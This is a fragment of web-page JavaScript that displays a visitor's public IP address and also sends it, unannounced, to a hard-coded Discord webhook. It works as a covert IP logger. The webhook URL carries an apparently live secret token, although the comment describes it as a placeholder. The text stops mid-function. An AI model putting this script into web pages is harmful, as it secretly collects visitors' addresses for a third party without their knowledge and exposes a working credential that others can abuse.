  <script type="application/javascript">
    function getIP(json) {
      var ipAddress = json.ip;
      document.getElementById("ip-address").innerText = "My public IP address is: " + ipAddress;

      // Send the IP address to the Discord webhook
      sendToDiscordWebhook(ipAddress);
    }

    function sendToDiscordWebhook(ip) {
      // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
      var discordWebhookUrl = "https://discord.com/api/webhooks/1134078951212470273/990I3QpnxKYWyyD8f7-SzRgs3I-XhPACT4lX4FkfU69yEaAzb1aUIjx7Orko2hH07y3C";

      // Create a new XMLHttpRequest to make a POST request to Discord webhook
      var xhr = new XMLHttpRequest();
      xhr.open("POST", discordWebhookUrl);

      // Set the content type to JSON
      xhr.setRequestHeader("Content-Type", "application/json");

      // Create the JSON payload
      var payload = {
        content: "My public IP address is: " + ip
      };

      // Convert the payload to JSON and send it
      xhr.send(JSON.stringify(payload));
